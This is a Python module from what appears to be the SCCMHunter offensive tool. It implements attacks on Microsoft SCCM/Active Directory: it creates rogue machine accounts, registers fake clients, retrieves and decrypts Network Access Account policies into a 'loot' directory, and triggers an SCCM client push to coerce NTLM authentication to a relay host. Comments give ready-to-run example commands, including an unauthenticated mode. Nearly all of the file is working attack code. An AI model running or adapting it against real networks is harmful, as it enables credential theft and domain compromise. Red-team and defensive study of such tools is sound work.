from cryptography.hazmat.primitives import serialization
from lib.ldap import init_ldap_session
from lib.logger import console, logger, init_logger
from lib.attacks.find import SCCMHUNTER
from lib.scripts.addcomputer import AddComputerSAMR
from lib.scripts.sccmwtf import SCCMTools, Tools
from lib.scripts.banner import show_banner
import requests
import getpass
import random
import string
import sqlite3
import ldap3
import time
import sys
import os
import re


class HTTP:
    
    def __init__(self, username=None, password=None, domain=None, target_dom=None, 
                    dc_ip=None,ldaps=False, channel_binding=False, kerberos=False, no_pass=False, hashes=None, 
                    aes=None, debug=False, auto=False, computer_pass=None, computer_hash=None,computer_name=None,
                    uuid=None, mp=None, sp=False, spcn=None, sppid=None, spanon=False,sleep=None, logs_dir=None):
        self.username = username
        self.password = password
        self.domain = domain
        self.target_dom = target_dom
        self.dc_ip = dc_ip
        self.ldaps = ldaps
        self.channel_binding = channel_binding
        self.kerberos = kerberos
        self.no_pass = no_pass
        self.hashes=hashes
        self.aes = aes
        self.debug = debug
        self.ldap_session = None
        self.search_base = None
        self.auto = auto
        self.computer_name = computer_name
        self.computer_hash = computer_hash
        self.computer_pass = computer_pass
        self.uuid = uuid
        self.mp = mp
        self.sp = sp
        self.spcn = spcn
        self.sppid = sppid
        self.spanon = spanon
        self.sleep = int(sleep)
        self.targets = []
        self.logs_dir = logs_dir
        self.database = f"{logs_dir}/db/find.db"
        self.conn = sqlite3.connect(self.database, check_same_thread=False)

 
    def run(self):
        if self.sp:
            self.sccm_push()
            return
        if self.uuid:
            self.manual_request()
            return
        if self.mp:
            self.autopwn()
        if os.path.exists(self.database):
            try:
                logger.info("[*] Searching for Management Points from database.")
                targets = set()
                mpscheck = self.conn.execute(f'''select Hostname FROM ManagementPoints''').fetchall()
                allcompscheck = self.conn.execute(f"SELECT Hostname FROM Computers WHERE ManagementPoint = 'True'").fetchall()
                for mp in mpscheck:
                    targets.add(mp[0])
                for mp in allcompscheck:
                    targets.add(mp[0])
                
                self.targets = self.http_hunter(targets)
                #print(targets)
                if self.targets:
                    self.autopwn()
            except sqlite3.OperationalError:
                logger.debug("[*] Database file not found. Did you run the find module?")
            except Exception as e:
                logger.info("An unknown error occured. Use -debug to print a stacktrace.")
                logger.debug(e)

    def manual_request(self):
        logger.info(f"Submitting manual policy request from previous registration {self.uuid}")
        try:
            #TODO: Need some terminal output for actions taken
            #      Need better error handling
            target_mp_url = f"http://{self.mp}"
            sccmwtf = SCCMTools(target_name="", target_fqdn="", target_sccm=target_mp_url, target_username="", target_password="", sleep=self.sleep, logs_dir=self.logs_dir,sp=self.sp,plid=self.sppid)
            with open (f"{self.logs_dir}/{self.uuid}.data", "rb") as f:
                data = f.read()
            with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
                key = serialization.load_pem_private_key(g.read(), password=b"mimikatz")
            deflatedData = sccmwtf.sendCCMPostRequest(data=data, mp=target_mp_url)
            result = re.search(r"PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
            urls = [result.group(1)]
            for url in urls:
                result = sccmwtf.requestPolicy(url)
                if result.startswith("<HTML>"):
                        result = sccmwtf.requestPolicy(url, self.uuid, True, True, key=key)
                        decryptedResult = sccmwtf.parseEncryptedPolicy(result)
                        sccmwtf.parse_xml(decryptedResult)
                        file_name = f"{self.logs_dir}/loot/naapolicy.xml"
                        Tools.write_to_file(decryptedResult, file_name)
                        logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/naapolicy.xml")
                        return True
        except FileNotFoundError:
            logger.info(f"Missing required files -- check the UUID.")
        except Exception as e:
            logger.info(e)
        
#examples:
# A. with an already compromised machine account:
#       python3 sccmhunter.py http  -mp '<target>' -cn  '<compromised_machine>$' -ch '<compromised_machine_ntlm_hash>' -sleep 10 -sp  -spcn '<ntlm_relay_IP>' -dc-ip <DC_IP>  -d <DOMAIN> 
# B. with a user/machine account that will (1)created a new machine account in the domain  (2) register a new client;
#       python3 sccmhunter.py http  -mp <target> -u '<username>' -p <password> -sleep 3 -sp  -spcn '<ntlm_relay_IP>' -dc-ip <DC_IP> -d <DOMAIN>
# C. Unauthenticated registration => unapproved client but still triggers the sccm push (may not work in certain cases) (actually very efficient during tests)
#        python3 sccmhunter.py http  -mp <target> -sleep 10 -sp  -spcn '<ntlm_relay_IP>' -dc-ip <DC_IP> -d <DOMAIN> -sppid 'Microsoft Windows NT Server 10.0' --sccm-push-anonymous
    def sccm_push(self):
        logger.info(f"[*] Performing SCCM client push attack")
        key = None

        if self.uuid:
            logger.info(f"Detected uuid, trying to reuse alreday created client with uuid: {self.uuid}, \n[!] probably wont work since client needs to be not installed to trigger sccm push... ")
            with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
                key = serialization.load_pem_private_key(g.read(), password=b"mimikatz")
        elif (self.computer_name and (self.computer_pass or self.computer_hash)) :
            logger.info(f"Detected provided computer name and credentials, trying to reuse already existing computer to enroll a new client !")
            if not self.computer_pass:
                self.computer_pass = '0'*32 + ':' + self.computer_hash
        elif (self.spanon):
            pass
        else:
            if not (self.username and (self.password or self.hashes)):
                logger.info("Missing user credentials, check your arguments and try again. You can also perform unauthenticated client registration --sccm-push-anonymous")
                sys.exit(1)
            if not (self.spcn):
                logger.info("[-] Client Name (-spcn) required when usign sccm push attack")
                sys.exit(1)
            logger.info("[*]Attempting to add a machine account then trigger sccm push.")
            self.computer_name = f'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')
            self.computer_pass = f''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
            samradd = AddComputerSAMR(self.username, self.password, self.domain, self.hashes, self.aes, self.kerberos, 
                                   self.dc_ip, self.computer_name, self.computer_pass)
            samradd.run()

            if self.validate_add(self.computer_name):
                logger.info(f'[+] {self.computer_name} created with password: {self.computer_pass}')
            else:
                logger.info(f'[-] Could not validate successful creation.')
       
            if not (self.computer_name or self.computer_pass):
                logger.info("[-] Missing machine account credentials, check your arguments and try again.")
                sys.exit()
        
        target_fqdn = f'{self.spcn.upper()}'
        sccmwtf = SCCMTools(target_name=self.spcn, target_fqdn=target_fqdn, 
                            target_sccm=self.mp,target_username=self.username, 
                            target_password=self.password, sleep=self.sleep, 
                            logs_dir=self.logs_dir,sp=self.sp,plid=self.sppid)
        try:
            uuid = self.uuid
            if not uuid:
                sccmwtf.createCertificate(True)
                uuid = sccmwtf.sendRegistration(self.spcn, target_fqdn,self.computer_name,self.computer_pass,isauthenticated=(not self.spanon),policies=False)
                sccmwtf.rename_key(uuid) #save key for reuse
                key = sccmwtf.key
                logger.info(f"[+] Client {self.spcn} registered with UUID: {uuid}")
                logger.info(f"[*] Waiting {self.sleep} seconds for database to update.")
                time.sleep(self.sleep)
            sccmwtf.sccmPush(uuid,self.spcn,self.domain,self.sppid,self.computer_name,self.computer_pass,key=key)
        except Exception as e:
            print(e)
            logger.info("[-] Something wrong occured")

    def autopwn(self):
        if self.auto:
            if not (self.username or self.password):
                logger.info("Missing user credentials, check your arguments and try again.")
                sys.exit()
            logger.info("[*] User selected auto. Attempting to add a machine account then request policies.")
            self.computer_name = f'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')
            self.computer_pass = f''.join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
            samradd = AddComputerSAMR(self.username, self.password, self.domain, self.hashes, self.aes, self.kerberos, 
                                   self.dc_ip, self.computer_name, self.computer_pass)
            samradd.run()

            if self.validate_add(self.computer_name):
                logger.info(f'[+] {self.computer_name} created with password: {self.computer_pass}')
            else:
                logger.info(f'[-] Could not validate successful creation.')
        
        if not (self.computer_name or self.computer_pass):
            logger.info("[-] Missing machine account credentials, check your arguments and try again.")
            sys.exit()


        if self.mp:
            self.targets = []
            self.targets.append(self.mp)
        for target in self.targets:
            target_name = self.computer_name[:-1]
            target_fqdn = f'{target_name}.{self.domain}'
            try:
                logger.info(f"[*] Attempting to grab policy from {target}")
                SCCMWTF=SCCMTools(target_name, target_fqdn, target, self.computer_name, self.computer_pass, self.sleep, self.logs_dir)
                SCCMWTF.sccmwtf_run()
            except Exception as e:
                logger.info(e)

    def http_hunter(self, servers):
        validated = []                   
        for server in servers:
            url=(f"http://{server}/ccm_system_windowsauth")
            url2=(f"http://{server}/ccm_system")
            try:
                x = requests.get(url, timeout=5)
                x2 = requests.get(url2,timeout=5)
                if x.status_code == 401:
                    logger.info(f"[+] Found {url}")
                    validated.append(server)
            except requests.exceptions.Timeout:
                logger.info(f"[-] {server} connection timed out.")
            except requests.ConnectionError as e:
                logger.info(f"[-] {server} doesn't appear to be a SCCM server.")
                pass
        if validated:
            return validated
        else:
            print("[-] No HTTP endpoints found :(")


    def validate_add(self, computername):
        lmhash = ""
        nthash = ""
        
        if self.hashes:
            lmhash, nthash = self.hashes.split(':')
        if not (self.password or self.hashes or self.aes or self.no_pass):
                self.password = getpass("Password:")

        # set search base to query
        if self.target_dom:
            self.search_base = self.get_dn(self.target_dom)
        else:
            self.search_base = self.get_dn(self.domain)

        try:
            ldap_server, self.ldap_session = init_ldap_session(domain=self.domain, username=self.username, password=self.password,
                                                           lmhash=lmhash, nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip, 
                                                           aesKey=self.aes, hashes=self.hashes, ldaps=self.ldaps, channel_binding=self.channel_binding)
            logger.debug(f'[+] Bind successful {ldap_server}')
            try:
                controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x07)
                self.ldap_session.extend.standard.paged_search(self.search_base, 
                                                               search_filter=f"(samaccountname={computername})", 
                                                               attributes="nTSecurityDescriptor", 
                                                               generator=False)
                return True
            except ldap3.core.exceptions.LDAPAttributeError as e:
                print()
                logger.info(f'[-] Error: {str(e)}')
                return False

        except ldap3.core.exceptions.LDAPSocketOpenError as e: 
            if 'invalid server address' in str(e):
                logger.info(f'[-] Invalid server address - {self.domain}')
            else:
                logger.info('[-] Error connecting to LDAP server')
                print()
                logger.info(e)
            return False
        except ldap3.core.exceptions.LDAPBindError as e:
            logger.info(f'[-] Error: {str(e)}')
            return False
        

    def get_dn(self, domain):
        components = domain.split('.')
        base = ''
        for comp in components:
            base += f',DC={comp}'
        
        return base[1:]
